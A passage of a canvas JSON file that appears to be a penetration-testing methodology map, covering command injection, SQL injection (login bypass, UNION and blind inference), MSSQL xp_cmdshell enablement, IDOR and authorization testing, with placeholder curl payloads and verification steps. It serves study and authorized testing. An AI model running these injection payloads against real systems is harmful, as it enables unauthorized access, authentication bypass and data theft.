      "id": "method:web-upload-path:next-2",
      "type": "text",
      "x": 7810,
      "y": 12381,
      "width": 620,
      "height": 276,
      "text": "### Prove effective file, registry and service-object permissions\n\n**When:** A privileged object appears writable or an ACL tool reports a useful right\n\n**Still required:** Correct trustee/token, object type and effective rights including parents and deny entries\n\n[[tracks/08 Windows Privilege Escalation.canvas|Prove effective file, registry and service-object permissions → 08 Windows Privilege Escalation]]",
      "color": "5"
    },
    {
      "id": "method:web-command:start",
      "type": "text",
      "x": 4750,
      "y": 13012,
      "width": 350,
      "height": 250,
      "text": "## Prove visible or blind operating-system command injection\n\nAn input appears in a command-like operation or causes shell-dependent behavior",
      "color": "5"
    },
    {
      "id": "method:web-command:discover",
      "type": "text",
      "x": 5250,
      "y": 12972,
      "width": 780,
      "height": 180,
      "text": "### Discover\n\n```text\ncurl -skG --data-urlencode 'PARAM=NORMAL_VALUE' http://TARGET:PORT/PATH\n```"
    },
    {
      "id": "method:web-command:interpret",
      "type": "text",
      "x": 6180,
      "y": 12952,
      "width": 580,
      "height": 156,
      "text": "### What the output establishes\n\nThe function and output suggest an OS utility consumer; the parameter's parsing boundary is the candidate.",
      "color": "6"
    },
    {
      "id": "method:web-command:validate",
      "type": "text",
      "x": 6180,
      "y": 13198,
      "width": 580,
      "height": 204,
      "text": "### Missing prerequisite\n\nReplay the real request with a benign id/whoami marker and a normal control. Require attributable command output, or repeat bounded timing/control tests for a blind sink. Reflected text or one slow response is not execution.",
      "color": "2"
    },
    {
      "id": "method:web-command:checks",
      "type": "text",
      "x": 5250,
      "y": 13212,
      "width": 780,
      "height": 132,
      "text": "### Validate the condition\n\n```bash\ncurl -skG --data-urlencode 'PARAM=VALUE;id' http://TARGET:PORT/PATH\n```"
    },
    {
      "id": "method:web-command:enabled",
      "type": "text",
      "x": 6960,
      "y": 12902,
      "width": 620,
      "height": 276,
      "text": "### Condition confirmed\n\nOnly the injected request yields the intended command-derived proof: select command injection.\n\n**Verify:** Use reproducible command-specific output or controlled timing comparisons; a server error alone does not prove execution.\n\n[[notes/web-exploitation.md#web-command|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-command:ruledout",
      "type": "text",
      "x": 6960,
      "y": 13243,
      "width": 620,
      "height": 156,
      "text": "### Condition disproved here\n\nThe input is passed as a fixed safe argument and metacharacters remain literal: reject that separator/context route.",
      "color": "1"
    },
    {
      "id": "method:web-command:unknown",
      "type": "text",
      "x": 6960,
      "y": 13464,
      "width": 620,
      "height": 156,
      "text": "### Evidence inconclusive\n\nA generic error or isolated delay could be application/load behavior; run stable controls before deciding.",
      "color": "2"
    },
    {
      "id": "method:web-command:action",
      "type": "text",
      "x": 7810,
      "y": 12902,
      "width": 900,
      "height": 252,
      "text": "### Procedure entry — full sequence in the note\n\n```bash\ncurl -skG --data-urlencode 'host=127.0.0.1;id' http://TARGET:PORT/PATH\ncurl -skG --data-urlencode 'host=127.0.0.1&whoami' http://TARGET:PORT/PATH\n```\n\n[[notes/web-exploitation.md#web-command|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-command:next-0",
      "type": "text",
      "x": 7810,
      "y": 13244,
      "width": 620,
      "height": 252,
      "text": "### Verify command execution, host and represented identity\n\n**When:** A PoC, injected command or remote client reports execution\n\n**Still required:** A functioning execution primitive and an observable output or controlled side effect\n\n[[tracks/06 Shells and Transfers.canvas|Verify command execution, host and represented identity → 06 Shells and Transfers]]",
      "color": "5"
    },
    {
      "id": "method:web-command:next-1",
      "type": "text",
      "x": 7810,
      "y": 13551,
      "width": 620,
      "height": 252,
      "text": "### Connect a Linux reverse shell through an available interpreter\n\n**When:** Linux command execution exists but an interactive channel is needed\n\n**Still required:** A confirmed Bash/Python/PHP/Netcat implementation, correct parser wrapping, target-to-listener route and compatible listener\n\n[[tracks/06 Shells and Transfers.canvas|Connect a Linux reverse shell through an available interpreter → 06 Shells and Transfers]]",
      "color": "5"
    },
    {
      "id": "method:web-command:next-2",
      "type": "text",
      "x": 7810,
      "y": 13858,
      "width": 620,
      "height": 252,
      "text": "### Repair quoting, encoding and command-length boundaries\n\n**When:** A simple command works while a longer or nested payload fails\n\n**Still required:** Known outer request/template/database parser and inner shell; correct character encoding and transport length\n\n[[tracks/11 Execution Troubleshooting.canvas|Repair quoting, encoding and command-length boundaries → 11 Execution Troubleshooting]]",
      "color": "5"
    },
    {
      "id": "method:sql-influence:start",
      "type": "text",
      "x": 4750,
      "y": 14465,
      "width": 350,
      "height": 250,
      "text": "## Establish SQL query influence and DBMS context\n\nDatabase errors or controlled true/false response differences",
      "color": "5"
    },
    {
      "id": "method:sql-influence:discover",
      "type": "text",
      "x": 5250,
      "y": 14425,
      "width": 780,
      "height": 204,
      "text": "### Discover\n\n```text\ncurl -skG --data-urlencode 'PARAM=NORMAL_VALUE' http://TARGET:PORT/PATH\ncurl -skG --data-urlencode \"PARAM=NORMAL_VALUE'\" http://TARGET:PORT/PATH\n```"
    },
    {
      "id": "method:sql-influence:interpret",
      "type": "text",
      "x": 6180,
      "y": 14405,
      "width": 580,
      "height": 156,
      "text": "### What the output establishes\n\nA database-looking error ties the input to a possible query parser; it is a hypothesis until controlled predicates affect query behavior.",
      "color": "6"
    },
    {
      "id": "method:sql-influence:validate",
      "type": "text",
      "x": 6180,
      "y": 14651,
      "width": 580,
      "height": 156,
      "text": "### Missing prerequisite\n\nIdentify quote/query context and repeat true/false comparisons; establish the DBMS before DB-specific payloads.",
      "color": "2"
    },
    {
      "id": "method:sql-influence:checks",
      "type": "text",
      "x": 5250,
      "y": 14689,
      "width": 780,
      "height": 132,
      "text": "### Validate the condition\n\n```bash\ncurl -skG --data-urlencode \"PARAM=VALUE'\" http://TARGET:PORT/PATH\n```"
    },
    {
      "id": "method:sql-influence:enabled",
      "type": "text",
      "x": 6960,
      "y": 14355,
      "width": 620,
      "height": 276,
      "text": "### Condition confirmed\n\nA compatible true/false pair reproducibly controls the query result: choose a manual SQL method.\n\n**Verify:** Require repeatable, query-dependent behavior and preserve request/session controls; identify DBMS evidence before DB-specific payloads.\n\n[[notes/web-exploitation.md#sql-influence|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:sql-influence:ruledout",
      "type": "text",
      "x": 6960,
      "y": 14696,
      "width": 620,
      "height": 156,
      "text": "### Condition disproved here\n\nThe error is a generic proxy/application response unrelated to SQL controls: reject this query-influence inference.",
      "color": "1"
    },
    {
      "id": "method:sql-influence:unknown",
      "type": "text",
      "x": 6960,
      "y": 14917,
      "width": 620,
      "height": 156,
      "text": "### Evidence inconclusive\n\nAn unstable page or expired session makes differences uninterpretable; restore a valid baseline.",
      "color": "2"
    },
    {
      "id": "method:sql-influence:action",
      "type": "text",
      "x": 7810,
      "y": 14355,
      "width": 900,
      "height": 300,
      "text": "### Procedure entry — full sequence in the note\n\n```text\nVALUE\nVALUE'\nVALUE' AND '1'='1\nVALUE' AND '1'='2\n```\n\n[[notes/web-exploitation.md#sql-influence|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:sql-influence:next-0",
      "type": "text",
      "x": 7810,
      "y": 14745,
      "width": 620,
      "height": 252,
      "text": "### Test a SQL-backed authentication bypass\n\n**When:** A login/query path has confirmed compatible SQL influence\n\n**Still required:** The injected condition changes the authentication query and the application accepts the resulting account/session\n\n**Test a SQL-backed authentication bypass — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:sql-influence:next-1",
      "type": "text",
      "x": 7810,
      "y": 15052,
      "width": 620,
      "height": 252,
      "text": "### Extract data through UNION and visible SQL results\n\n**When:** An injectable SELECT renders query results\n\n**Still required:** Compatible column count/types, a reflected result position and rights to the requested data\n\n**Extract data through UNION and visible SQL results — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:sql-influence:next-2",
      "type": "text",
      "x": 7810,
      "y": 15359,
      "width": 620,
      "height": 252,
      "text": "### Infer SQL data through boolean or time-based differences\n\n**When:** Query influence exists but rows are not rendered\n\n**Still required:** A stable boolean response difference or controlled DB-specific delay; comparable repeated baseline requests\n\n**Infer SQL data through boolean or time-based differences — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:sql-auth:start",
      "type": "text",
      "x": 4750,
      "y": 15966,
      "width": 350,
      "height": 250,
      "text": "## Test a SQL-backed authentication bypass\n\nA login/query path has confirmed compatible SQL influence",
      "color": "5"
    },
    {
      "id": "method:sql-auth:discover",
      "type": "text",
      "x": 5250,
      "y": 15926,
      "width": 780,
      "height": 204,
      "text": "### Discover\n\n```text\ncurl -sk -i --data-urlencode 'username=USER' --data-urlencode 'password=INVALID_CONTROL' http://TARGET:PORT/login\n```"
    },
    {
      "id": "method:sql-auth:interpret",
      "type": "text",
      "x": 6180,
      "y": 15906,
      "width": 580,
      "height": 156,
      "text": "### What the output establishes\n\nThe authentication decision may depend on the injectable query result, creating a bypass candidate.",
      "color": "6"
    },
    {
      "id": "method:sql-auth:validate",
      "type": "text",
      "x": 6180,
      "y": 16152,
      "width": 580,
      "height": 156,
      "text": "### Missing prerequisite\n\nVerify query shape and post-query checks, then independently confirm the resulting session identity/protected action.",
      "color": "2"
    },
    {
      "id": "method:sql-auth:checks",
      "type": "text",
      "x": 5250,
      "y": 16190,
      "width": 780,
      "height": 156,
      "text": "### Validate the condition\n\n```bash\ncurl -sk -i -c cookies.txt --data-urlencode \"username=USER' OR '1'='1'-- -\" --data-urlencode 'password=INVALID_CONTROL' http://TARGET:PORT/login\n```"
    },
    {
      "id": "method:sql-auth:enabled",
      "type": "text",
      "x": 6960,
      "y": 15856,
      "width": 620,
      "height": 276,
      "text": "### Condition confirmed\n\nA controlled SQL condition creates a real authenticated session with the intended action: select the bypass route.\n\n**Verify:** Verify the authenticated identity and protected action, not merely a redirect or a new cookie.\n\n[[notes/web-exploitation.md#sql-auth|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:sql-auth:ruledout",
      "type": "text",
      "x": 6960,
      "y": 16197,
      "width": 620,
      "height": 156,
      "text": "### Condition disproved here\n\nThe application separately verifies the password after query selection: reject that bypass while retaining other SQL primitives.",
      "color": "1"
    },
    {
      "id": "method:sql-auth:unknown",
      "type": "text",
      "x": 6960,
      "y": 16418,
      "width": 620,
      "height": 156,
      "text": "### Evidence inconclusive\n\nA redirect or cookie without protected access leaves authentication success unresolved.",
      "color": "2"
    },
    {
      "id": "method:sql-auth:action",
      "type": "text",
      "x": 7810,
      "y": 15856,
      "width": 900,
      "height": 252,
      "text": "### Procedure entry — full sequence in the note\n\n```text\n' OR 1=1-- -\nadministrator'-- -\n```\n\n[[notes/web-exploitation.md#sql-auth|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:sql-auth:next-0",
      "type": "text",
      "x": 7810,
      "y": 16198,
      "width": 620,
      "height": 276,
      "text": "### Map functions, roles and normal requests manually\n\n**When:** Forms, downloads, exports, account functions or role-specific interfaces\n\n**Still required:** A normal request baseline and the relevant account/role; authorized accounts for role comparisons\n\n**Map functions, roles and normal requests manually — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:sql-auth:next-1",
      "type": "text",
      "x": 7810,
      "y": 16529,
      "width": 620,
      "height": 276,
      "text": "### Cross role, function or session authorization boundaries\n\n**When:** Administrative actions/routes or request methods visible from a lower role\n\n**Still required:** The lower-role identity can invoke a protected server-side action without its required authorization\n\n**Cross role, function or session authorization boundaries — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:sql-auth:next-2",
      "type": "text",
      "x": 7810,
      "y": 16860,
      "width": 620,
      "height": 252,
      "text": "### Extract data through UNION and visible SQL results\n\n**When:** An injectable SELECT renders query results\n\n**Still required:** Compatible column count/types, a reflected result position and rights to the requested data\n\n**Extract data through UNION and visible SQL results — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:sql-union:start",
      "type": "text",
      "x": 4750,
      "y": 17467,
      "width": 350,
      "height": 250,
      "text": "## Extract data through UNION and visible SQL results\n\nAn injectable SELECT renders query results",
      "color": "5"
    },
    {
      "id": "method:sql-union:discover",
      "type": "text",
      "x": 5250,
      "y": 17427,
      "width": 780,
      "height": 180,
      "text": "### Discover\n\n```text\ncurl -skG --data-urlencode \"PARAM=VALUE' ORDER BY 1-- -\" http://TARGET:PORT/PATH\n```"
    },
    {
      "id": "method:sql-union:interpret",
      "type": "text",
      "x": 6180,
      "y": 17407,
      "width": 580,
      "height": 156,
      "text": "### What the output establishes\n\nA predictable shape boundary in a rendered SELECT suggests a UNION channel, subject to column types and reflection.",
      "color": "6"
    },
    {
      "id": "method:sql-union:validate",
      "type": "text",
      "x": 6180,
      "y": 17653,
      "width": 580,
      "height": 156,
      "text": "### Missing prerequisite\n\nConfirm column count/types and a query-generated visible marker before extracting selected metadata.",
      "color": "2"
    },
    {
      "id": "method:sql-union:enabled",
      "type": "text",
      "x": 6960,
      "y": 17357,
      "width": 620,
      "height": 276,
      "text": "### Condition confirmed\n\nA compatible marker appears from a UNION result column: choose visible manual extraction.\n\n**Verify:** Verify actual returned target data and the reflected position; distinguish a reflected input string from executed SQL output.\n\n[[notes/web-exploitation.md#sql-union|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:sql-union:ruledout",
      "type": "text",
      "x": 6960,
      "y": 17698,
      "width": 620,
      "height": 156,
      "text": "### Condition disproved here\n\nThe injection is in a non-SELECT context without a compatible result channel: reject UNION in this request.",
      "color": "1"
    },
    {
      "id": "method:sql-union:unknown",
      "type": "text",
      "x": 6960,
      "y": 17919,
      "width": 620,
      "height": 156,
      "text": "### Evidence inconclusive\n\nNo marker can mean type/shape error or an unrendered column; distinguish these before switching techniques.",
      "color": "2"
    },
    {
      "id": "method:sql-union:action",
      "type": "text",
      "x": 7810,
      "y": 17357,
      "width": 900,
      "height": 276,
      "text": "### Procedure entry — full sequence in the note\n\n```text\n' ORDER BY 1-- -\n' ORDER BY 2-- -\n' ORDER BY 3-- -\n```\n\n[[notes/web-exploitation.md#sql-union|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:sql-union:next-0",
      "type": "text",
      "x": 7810,
      "y": 17723,
      "width": 620,
      "height": 276,
      "text": "### Classify the artifact and its identity context\n\n**When:** A secret-like value, key file, stored hash, challenge response or ticket\n\n**Still required:** Artifact provenance and format; possible local/domain/application identity and compatible protocol\n\n[[tracks/05 Credentials.canvas|Classify the artifact and its identity context → 05 Credentials]]",
      "color": "5"
    },
    {
      "id": "method:sql-union:next-1",
      "type": "text",
      "x": 7810,
      "y": 18054,
      "width": 620,
      "height": 276,
      "text": "### Convert database rights into a file or operating-system effect\n\n**When:** Confirmed SQL control plus database file, execution or impersonation privileges\n\n**Still required:** DBMS-specific privilege and enabled facility; OS service identity, writable/readable destination and a compatible consumer\n\n**Convert database rights into a file or operating-system effect — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:sql-union:next-2",
      "type": "text",
      "x": 7810,
      "y": 18385,
      "width": 620,
      "height": 252,
      "text": "### Infer SQL data through boolean or time-based differences\n\n**When:** Query influence exists but rows are not rendered\n\n**Still required:** A stable boolean response difference or controlled DB-specific delay; comparable repeated baseline requests\n\n**Infer SQL data through boolean or time-based differences — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:sql-blind:start",
      "type": "text",
      "x": 4750,
      "y": 18992,
      "width": 350,
      "height": 250,
      "text": "## Infer SQL data through boolean or time-based differences\n\nQuery influence exists but rows are not rendered",
      "color": "5"
    },
    {
      "id": "method:sql-blind:discover",
      "type": "text",
      "x": 5250,
      "y": 18952,
      "width": 780,
      "height": 204,
      "text": "### Discover\n\n```text\ncurl -sk -o /dev/null -w '%{time_total}\\n' --get --data-urlencode 'PARAM=BASELINE_VALUE' http://TARGET:PORT/PATH\n```"
    },
    {
      "id": "method:sql-blind:interpret",
      "type": "text",
      "x": 6180,
      "y": 18932,
      "width": 580,
      "height": 156,
      "text": "### What the output establishes\n\nA repeatable predicate-dependent difference provides an inference channel even without visible rows.",
      "color": "6"
    },
    {
      "id": "method:sql-blind:validate",
      "type": "text",
      "x": 6180,
      "y": 19178,
      "width": 580,
      "height": 156,
      "text": "### Missing prerequisite\n\nValidate controls using a known predicate and separate caching, network load and backend delay.",
      "color": "2"
    },
    {
      "id": "method:sql-blind:enabled",
      "type": "text",
      "x": 6960,
      "y": 18882,
      "width": 620,
      "height": 276,
      "text": "### Condition confirmed\n\nKnown predicates classify consistently and unknown predicates use the same channel: select blind inference.\n\n**Verify:** Keep true/false controls, repeated measurements and the exact inferred predicate; a single slow response is inconclusive.\n\n[[notes/web-exploitation.md#sql-blind|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:sql-blind:ruledout",
      "type": "text",
      "x": 6960,
      "y": 19223,
      "width": 620,
      "height": 156,
      "text": "### Condition disproved here\n\nDifferences track session/rate-limit noise rather than predicate truth: reject that signal.",
      "color": "1"
    },
    {
      "id": "method:sql-blind:unknown",
      "type": "text",
      "x": 6960,
      "y": 19444,
      "width": 620,
      "height": 156,
      "text": "### Evidence inconclusive\n\nOne slow request or random body variation is insufficient; repeat controls or choose another primitive.",
      "color": "2"
    },
    {
      "id": "method:sql-blind:action",
      "type": "text",
      "x": 7810,
      "y": 18882,
      "width": 900,
      "height": 252,
      "text": "### Procedure entry — full sequence in the note\n\n```text\n' AND SUBSTRING((SELECT version()),1,1)='P'-- -\n' AND SUBSTRING((SELECT version()),1,1)='X'-- -\n```\n\n[[notes/web-exploitation.md#sql-blind|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:sql-blind:next-0",
      "type": "text",
      "x": 7810,
      "y": 19224,
      "width": 620,
      "height": 276,
      "text": "### Classify the artifact and its identity context\n\n**When:** A secret-like value, key file, stored hash, challenge response or ticket\n\n**Still required:** Artifact provenance and format; possible local/domain/application identity and compatible protocol\n\n[[tracks/05 Credentials.canvas|Classify the artifact and its identity context → 05 Credentials]]",
      "color": "5"
    },
    {
      "id": "method:sql-blind:next-1",
      "type": "text",
      "x": 7810,
      "y": 19555,
      "width": 620,
      "height": 276,
      "text": "### Convert database rights into a file or operating-system effect\n\n**When:** Confirmed SQL control plus database file, execution or impersonation privileges\n\n**Still required:** DBMS-specific privilege and enabled facility; OS service identity, writable/readable destination and a compatible consumer\n\n**Convert database rights into a file or operating-system effect — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:sql-blind:next-2",
      "type": "text",
      "x": 7810,
      "y": 19886,
      "width": 620,
      "height": 276,
      "text": "### Map functions, roles and normal requests manually\n\n**When:** Forms, downloads, exports, account functions or role-specific interfaces\n\n**Still required:** A normal request baseline and the relevant account/role; authorized accounts for role comparisons\n\n**Map functions, roles and normal requests manually — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:sql-blind:next-3",
      "type": "text",
      "x": 7810,
      "y": 20217,
      "width": 620,
      "height": 276,
      "text": "### Conditional: validate an out-of-band SQL request channel\n\n**When:** SQL execution is plausible but in-band output is unavailable\n\n**Still required:** A DBMS/function capable of the selected outbound lookup, sufficient database/OS rights, allowed egress and a uniquely identifiable controlled receiver\n\n**Conditional: validate an out-of-band SQL request channel — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:sql-os:start",
      "type": "text",
      "x": 4750,
      "y": 20848,
      "width": 350,
      "height": 250,
      "text": "## Convert database rights into a file or operating-system effect\n\nConfirmed SQL control plus database file, execution or impersonation privileges",
      "color": "5"
    },
    {
      "id": "method:sql-os:discover",
      "type": "text",
      "x": 5250,
      "y": 20808,
      "width": 780,
      "height": 204,
      "text": "### Discover\n\n```text\nSELECT SYSTEM_USER, ORIGINAL_LOGIN();\nSELECT IS_SRVROLEMEMBER('sysadmin');\n```"
    },
    {
      "id": "method:sql-os:interpret",
      "type": "text",
      "x": 6180,
      "y": 20788,
      "width": 580,
      "height": 156,
      "text": "### What the output establishes\n\nDatabase administration is a useful enabling clue, but it is not an observed OS shell or a domain privilege level.",
      "color": "6"
    },
    {
      "id": "method:sql-os:validate",
      "type": "text",
      "x": 6180,
      "y": 21034,
      "width": 580,
      "height": 156,
      "text": "### Missing prerequisite\n\nMatch the DBMS-specific facility, configuration, OS permission and consumer; verify a minimal actual OS effect.",
      "color": "2"
    },
    {
      "id": "method:sql-os:enabled",
      "type": "text",
      "x": 6960,
      "y": 20738,
      "width": 620,
      "height": 276,
      "text": "### Condition confirmed\n\nRequired role/facility and service-identity effect are confirmed: select the supported database-to-OS method.\n\n**Verify:** Verify the resulting host and operating-system identity, or independently verify written/read bytes.\n\n[[notes/web-exploitation.md#sql-os|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:sql-os:ruledout",
      "type": "text",
      "x": 6960,
      "y": 21079,
      "width": 620,
      "height": 156,
      "text": "### Condition disproved here\n\nThe required file/command privilege is absent: discard that OS transition while retaining data access.",
      "color": "1"
    },
    {
      "id": "method:sql-os:unknown",
      "type": "text",
      "x": 6960,
      "y": 21300,
      "width": 620,
      "height": 156,
      "text": "### Evidence inconclusive\n\nUnknown facility state or OS identity needs a focused check before choosing payloads.",
      "color": "2"
    },
    {
      "id": "method:sql-os:action",
      "type": "text",
      "x": 7810,
      "y": 20738,
      "width": 900,
      "height": 324,
      "text": "### Procedure entry — full sequence in the note\n\n```sql\nEXEC sp_configure 'show advanced options', 1;\nRECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1;\nRECONFIGURE;\nEXEC xp_cmdshell 'whoami';\n```\n\n[[notes/web-exploitation.md#sql-os|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:sql-os:next-0",
      "type": "text",
      "x": 7810,
      "y": 21152,
      "width": 620,
      "height": 252,
      "text": "### Verify command execution, host and represented identity\n\n**When:** A PoC, injected command or remote client reports execution\n\n**Still required:** A functioning execution primitive and an observable output or controlled side effect\n\n[[tracks/06 Shells and Transfers.canvas|Verify command execution, host and represented identity → 06 Shells and Transfers]]",
      "color": "5"
    },
    {
      "id": "method:sql-os:next-1",
      "type": "text",
      "x": 7810,
      "y": 21459,
      "width": 620,
      "height": 276,
      "text": "### Classify the artifact and its identity context\n\n**When:** A secret-like value, key file, stored hash, challenge response or ticket\n\n**Still required:** Artifact provenance and format; possible local/domain/application identity and compatible protocol\n\n[[tracks/05 Credentials.canvas|Classify the artifact and its identity context → 05 Credentials]]",
      "color": "5"
    },
    {
      "id": "method:sql-os:next-2",
      "type": "text",
      "x": 7810,
      "y": 21790,
      "width": 620,
      "height": 252,
      "text": "### Establish Windows token, host and process context\n\n**When:** A new Windows session or claimed administrator/SYSTEM transition\n\n**Still required:** A functioning command channel and the actual effective token/process context\n\n[[tracks/08 Windows Privilege Escalation.canvas|Establish Windows token, host and process context → 08 Windows Privilege Escalation]]",
      "color": "5"
    },
    {
      "id": "method:web-idor:start",
      "type": "text",
      "x": 4750,
      "y": 22397,
      "width": 350,
      "height": 250,
      "text": "## Cross an object-ownership boundary\n\nA request selects an object by ID/path and two authorized ownership contexts are available",
      "color": "5"
    },
    {
      "id": "method:web-idor:discover",
      "type": "text",
      "x": 5250,
      "y": 22357,
      "width": 780,
      "height": 180,
      "text": "### Discover\n\n```text\ncurl -sk -b lower-role.cookies http://TARGET:PORT/api/objects/OBJECT_ID\n```"
    },
    {
      "id": "method:web-idor:interpret",
      "type": "text",
      "x": 6180,
      "y": 22337,
      "width": 580,
      "height": 156,
      "text": "### What the output establishes\n\nA private object owned by another controlled account is returned to the lower-context requester.",
      "color": "6"
    },
    {
      "id": "method:web-idor:validate",
      "type": "text",
      "x": 6180,
      "y": 22583,
      "width": 580,
      "height": 156,
      "text": "### Missing prerequisite\n\nConfirm intended sharing rules, account isolation and actual object content/change with valid controls.",
      "color": "2"
    },
    {
      "id": "method:web-idor:enabled",
      "type": "text",
      "x": 6960,
      "y": 22287,
      "width": 620,
      "height": 276,
      "text": "### Condition confirmed\n\nThe action crosses a real ownership boundary: use the demonstrated read/write primitive.\n\n**Verify:** Verify object ownership, requesting identity and the actual unauthorized effect.\n\n[[notes/web-exploitation.md#web-idor|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-idor:ruledout",
      "type": "text",
      "x": 6960,
      "y": 22628,
      "width": 620,
      "height": 156,
      "text": "### Condition disproved here\n\nThe object is intentionally public/shared: reject unauthorized-access inference from its ID alone.",
      "color": "1"
    },
    {
      "id": "method:web-idor:unknown",
      "type": "text",
      "x": 6960,
      "y": 22849,
      "width": 620,
      "height": 132,
      "text": "### Evidence inconclusive\n\nUnknown ownership or identical generic pages leave the access claim unproved.",
      "color": "2"
    },
    {
      "id": "method:web-idor:action",
      "type": "text",
      "x": 7810,
      "y": 22287,
      "width": 900,
      "height": 276,
      "text": "### Procedure entry — full sequence in the note\n\n```http\nGET /api/orders/OBJECT_B HTTP/1.1\nHost: DOMAIN\nAuthorization: Bearer USER_A_TOKEN\n```\n\n[[notes/web-exploitation.md#web-idor|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-idor:next-0",
      "type": "text",
      "x": 7810,
      "y": 22653,
      "width": 620,
      "height": 276,
      "text": "### Classify the artifact and its identity context\n\n**When:** A secret-like value, key file, stored hash, challenge response or ticket\n\n**Still required:** Artifact provenance and format; possible local/domain/application identity and compatible protocol\n\n[[tracks/05 Credentials.canvas|Classify the artifact and its identity context → 05 Credentials]]",
      "color": "5"
    },
    {
      "id": "method:web-idor:next-1",
      "type": "text",
      "x": 7810,
      "y": 22984,
      "width": 620,
      "height": 276,
      "text": "### Cross role, function or session authorization boundaries\n\n**When:** Administrative actions/routes or request methods visible from a lower role\n\n**Still required:** The lower-role identity can invoke a protected server-side action without its required authorization\n\n**Cross role, function or session authorization boundaries — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:web-idor:next-2",
      "type": "text",
      "x": 7810,
      "y": 23315,
      "width": 620,
      "height": 276,
      "text": "### Inspect source, backups, configuration and repository artifacts\n\n**When:** JavaScript endpoints, backup names, exposed configuration or Git metadata\n\n**Still required:** Readable application artifact or a complete recoverable repository; preserve the public-source scope\n\n**Inspect source, backups, configuration and repository artifacts — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:web-authz:start",
      "type": "text",
      "x": 4750,
      "y": 23946,
      "width": 350,
      "height": 250,
      "text": "## Cross role, function or session authorization boundaries\n\nAdministrative actions/routes or request methods visible from a lower role",
      "color": "5"
    },
    {
      "id": "method:web-authz:discover",
      "type": "text",
      "x": 5250,
      "y": 23906,
      "width": 780,
      "height": 180,
      "text": "### Discover\n\n```text\ncurl -sk -i -b lower-role.cookies http://TARGET:PORT/ADMIN_PATH\n```"
    },
    {
      "id": "method:web-authz:interpret",
      "type": "text",
      "x": 6180,
      "y": 23886,
      "width": 580,
      "height": 156,
      "text": "### What the output establishes\n\nA visible administrative route is a lead; only a server-side protected effect establishes the missing role check.",
      "color": "6"
    },
    {
      "id": "method:web-authz:validate",
      "type": "text",
      "x": 6180,
      "y": 24132,
      "width": 580,
      "height": 156,
      "text": "### Missing prerequisite\n\nReplay a valid authorized action under the lower context and independently inspect its permitted effect.",
      "color": "2"
    },
    {
      "id": "method:web-authz:enabled",
      "type": "text",
      "x": 6960,
      "y": 23836,
      "width": 620,
      "height": 276,
      "text": "### Condition confirmed\n\nThe lower context performs the protected action: select the function/role authorization method.\n\n**Verify:** Prove the protected effect and requesting identity; a rendered administrative page without action rights is a weaker finding.\n\n[[notes/web-exploitation.md#web-authz|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-authz:ruledout",
      "type": "text",
      "x": 6960,
      "y": 24177,
      "width": 620,
      "height": 156,
      "text": "### Condition disproved here\n\nOnly the form is visible and every protected action is correctly denied: reject action-level compromise.",
      "color": "1"
    },
    {
      "id": "method:web-authz:unknown",
      "type": "text",
      "x": 6960,
      "y": 24398,
      "width": 620,
      "height": 156,
      "text": "### Evidence inconclusive\n\nCSRF/session failure prevents assessing authorization; repair the normal request first.",
      "color": "2"
    },
    {
      "id": "method:web-authz:action",
      "type": "text",
      "x": 7810,
      "y": 23836,
      "width": 900,
      "height": 228,
      "text": "### Procedure entry — full sequence in the note\n\n```text\nanonymous -> ordinary user -> alternate ordinary user -> administrator\n```\n\n[[notes/web-exploitation.md#web-authz|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-authz:next-0",
      "type": "text",
      "x": 7810,
      "y": 24154,
      "width": 620,
      "height": 252,
      "text": "### Modify a protected property through excessive writable fields\n\n**When:** API objects expose role, ownership or security-sensitive properties\n\n**Still required:** The server binds an untrusted property to a persistent security-relevant field without checking permission\n\n**Modify a protected property through excessive writable fields — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:web-authz:next-1",
      "type": "text",
      "x": 7810,
      "y": 24461,
      "width": 620,
      "height": 276,
      "text": "### Use WordPress component evidence and authorized administration features\n\n**When:** WordPress paths/components or an accepted application administrator credential\n\n**Still required:** Exact component/version or a verified role; file-edit/plugin installation rights and runtime write/execution must be checked\n\n**Use WordPress component evidence and authorized administration features — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:web-authz:next-2",
      "type": "text",
      "x": 7810,
      "y": 24792,
      "width": 620,
      "height": 276,
      "text": "### Classify the artifact and its identity context\n\n**When:** A secret-like value, key file, stored hash, challenge response or ticket\n\n**Still required:** Artifact provenance and format; possible local/domain/application identity and compatible protocol\n\n[[tracks/05 Credentials.canvas|Classify the artifact and its identity context → 05 Credentials]]",
      "color": "5"
    },
    {
      "id": "method:web-mass-assignment:start",
      "type": "text",
      "x": 4750,
      "y": 25423,
      "width": 350,
      "height": 250,
      "text": "## Modify a protected property through excessive writable fields\n\nAPI objects expose role, ownership or security-sensitive properties",
      "color": "5"
    },
    {
      "id": "method:web-mass-assignment:discover",
      "type": "text",
      "x": 5250,
      "y": 25383,
      "width": 780,
      "height": 180,
      "text": "### Discover\n\n```text\ncurl -sk -b cookies.txt http://TARGET:PORT/api/PROFILE_PATH\n```"
    },
